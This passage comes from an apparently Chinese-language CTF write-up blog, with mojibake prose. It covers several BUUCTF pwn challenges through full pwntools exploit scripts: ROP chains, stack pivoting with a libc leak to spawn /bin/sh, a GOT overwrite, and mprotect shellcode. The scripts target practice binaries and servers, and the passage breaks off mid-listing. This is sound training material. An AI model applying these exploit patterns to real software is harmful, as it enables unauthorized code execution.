class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwnme2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26032</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwnme2&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets = elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">exec_string = <span class="number">0x080485CB</span> </span><br><span class="line">string = <span class="number">0x0804A060</span></span><br><span class="line">payload = (<span class="number">0x6c</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span> + p32(gets) + p32(exec_string)+p32(string)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æ­£å¸¸expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwnme2&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;node4.buuoj.cn&quot;,26032)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwnme2&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets = elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">exec_string = <span class="number">0x080485CB</span> </span><br><span class="line">add_home = <span class="number">0x08048644</span></span><br><span class="line">add_flag = <span class="number">0x08048682</span></span><br><span class="line">pop_ret = <span class="number">0x08048680</span></span><br><span class="line"></span><br><span class="line">pop_pop_ret = <span class="number">0x0804867f</span></span><br><span class="line">string = <span class="number">0x0804A060</span></span><br><span class="line"><span class="comment"># payload = (0x6c+4)*&#x27;a&#x27; + p32(gets) + p32(exec_string)+p32(string)</span></span><br><span class="line"><span class="comment"># io.sendline(payload)</span></span><br><span class="line"><span class="comment"># io.recv()</span></span><br><span class="line"><span class="comment"># io.sendline(&#x27;flag&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x6c</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span> + p32(add_home)+p32(pop_ret)+ p32(<span class="number">0xDEADBEEF</span>)+p32(add_flag)+p32(pop_pop_ret)+p32(<span class="number">0xCAFEBABE</span>)+p32(<span class="number">0xABADF00D</span>) + p32(exec_string)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x47-actf-2019-babystack"><a href="#0x47-actf-2019-babystack" class="headerlink" title="0x47.actf_2019_babystack"></a>0x47.actf_2019_babystack</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ checksec ACTF_2019_babystack</span><br><span class="line">[*] <span class="string">&#x27;/home/yutao/Desktop/ACTF_2019_babystack&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009C1 loc_4009C1:                             ; CODE XREF: main+B8â†‘j</span><br><span class="line">.text:00000000004009C1                 lea     rax, [rbp+s]</span><br><span class="line">.text:00000000004009C8                 mov     rsi, rax</span><br><span class="line">.text:00000000004009CB                 mov     edi, offset format ; &quot;Your message will be saved at %p\n&quot;</span><br><span class="line">.text:00000000004009D0                 mov     eax, 0</span><br><span class="line">.text:00000000004009D5                 call    _printf</span><br><span class="line">.text:00000000004009DA                 mov     edi, offset aWhatIsTheConte ; &quot;What is the content of your message?&quot;</span><br><span class="line">.text:00000000004009DF                 call    _puts</span><br><span class="line">.text:00000000004009E4                 mov     edi, 3Eh ; &#x27;&gt;&#x27;  ; c</span><br><span class="line">.text:00000000004009E9                 call    _putchar</span><br><span class="line">.text:00000000004009EE                 mov     rdx, cs:nbytes  ; nbytes</span><br><span class="line">.text:00000000004009F5                 lea     rax, [rbp+s]</span><br><span class="line">.text:00000000004009FC                 mov     rsi, rax        ; buf</span><br><span class="line">.text:00000000004009FF                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400A04                 call    _read</span><br><span class="line">.text:0000000000400A09                 mov     edi, offset aByebye ; &quot;Byebye~&quot;</span><br><span class="line">.text:0000000000400A0E                 call    _puts</span><br><span class="line">.text:0000000000400A13                 mov     eax, 0</span><br><span class="line">.text:0000000000400A18</span><br><span class="line">.text:0000000000400A18 locret_400A18:                          ; CODE XREF: main+C9â†‘j</span><br><span class="line">.text:0000000000400A18                 leave</span><br><span class="line">.text:0000000000400A19                 retn</span><br></pre></td></tr></table></figure><p>å¯ä»¥å°±è¿›è¡Œæ ˆè¿ç§»</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./ACTF_2019_babystack&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26812</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ACTF_2019_babystack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.27.so&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">main_addr = <span class="number">0x04008F6</span> </span><br><span class="line">leave_ret = <span class="number">0x0400a18</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400ad3</span></span><br><span class="line">ret = <span class="number">0x400a4f</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;224&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;at &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(main_addr)</span><br><span class="line">payload += (<span class="number">0xd0</span>-<span class="built_in">len</span>(payload))*<span class="string">&#x27;a&#x27;</span> + p64(stack_addr)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Byebye~\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;224&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;at &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)</span><br><span class="line">payload += (<span class="number">0xd0</span>-<span class="built_in">len</span>(payload))*<span class="string">&#x27;a&#x27;</span> + p64(stack_addr)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x48-picoctf-2018-got-shell"><a href="#0x48-picoctf-2018-got-shell" class="headerlink" title="0x48.picoctf_2018_got_shell"></a>0x48.picoctf_2018_got_shell</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ checksec ./PicoCTF_2018_got-shell</span><br><span class="line">[*] <span class="string">&#x27;/home/yutao/Desktop/PicoCTF_2018_got-shell&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// [esp+14h] [ebp-114h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+18h] [ebp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">256</span>]; <span class="comment">// [esp+1Ch] [ebp-10Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+11Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;Okay, now what value would you like to write to 0x%x&quot;</span>, v3);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;Okay, writing 0x%x to 0x%x&quot;</span>, v4, v3);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  *v3 = v4;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Okay, exiting now...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>hijack got</strong>ï¼Œå°†putsæˆ–è€…exitçš„gotæ”¹ä¸ºåé—¨å‡½æ•°çš„åœ°å€å°±OKï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./PicoCTF_2018_got-shell&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28301</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./PicoCTF_2018_got-shell&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(elf.sym[<span class="string">&#x27;win&#x27;</span>]))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x49-picoctf-2018-can-you-gets-me"><a href="#0x49-picoctf-2018-can-you-gets-me" class="headerlink" title="0x49.picoctf_2018_can_you_gets_me"></a>0x49.picoctf_2018_can_you_gets_me</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ checksec  ./PicoCTF_2018_can-you-gets-me</span><br><span class="line">[*] <span class="string">&#x27;/home/yutao/Desktop/PicoCTF_2018_can-you-gets-me&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>é™æ€ç¼–è¯‘ï¼Œå¯ä»¥ç›´æ¥ï¼š<code>ROPgadget --binary PicoCTF_2018_can-you-gets-me  --ropchain</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io= process(<span class="string">&quot;./PicoCTF_2018_can-you-gets-me&quot;</span>) </span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80                                                                             </span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./PicoCTF_2018_can-you-gets-me&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;node4.buuoj.cn&quot;,28301)</span></span><br><span class="line">int_80 = <span class="number">0x0806cc25</span>   </span><br><span class="line">pop_eax = <span class="number">0x080b81c6</span>    </span><br><span class="line">pop_ebx = <span class="number">0x080481c9</span>    </span><br><span class="line">pop_ecx = <span class="number">0x080de955</span>   </span><br><span class="line">pop_edx = <span class="number">0x0806f02a</span>  </span><br><span class="line">bin_sh_addr = <span class="number">0x80e9000</span> </span><br><span class="line">gets_addr = <span class="number">0x0804F120</span>  </span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) </span><br><span class="line">payload += p32(gets_addr)</span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(bin_sh_addr)</span><br><span class="line">payload += p32(pop_eax)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_ebx)</span><br><span class="line">payload += p32(bin_sh_addr)</span><br><span class="line">payload += p32(pop_ecx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(pop_edx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;GIVE ME YOUR NAME!&quot;</span>)    </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æˆ–è€…å¯ä»¥ä½¿ç”¨mprotectï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#process(&#x27;./PicoCTF_2018_can-you-gets-me&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_can-you-gets-me&#x27;</span>)</span><br><span class="line">sc_addr = (e.bss() + <span class="number">0x1000</span>) </span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = e.search(asm(<span class="string">&#x27;pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#x27;</span>)).__next__()</span><br><span class="line">mprotect_addr = e.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+ p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x4A-mrctf2020-easy-equation"><a href="#0x4A-mrctf2020-easy-equation" class="headerlink" title="0x4A.mrctf2020_easy_equation"></a>0x4A.mrctf2020_easy_equation</h1><p>å¼€äº†NXï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec mrctf2020_easy_equation </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/mrctf2020_easy_equation&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™å°æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> 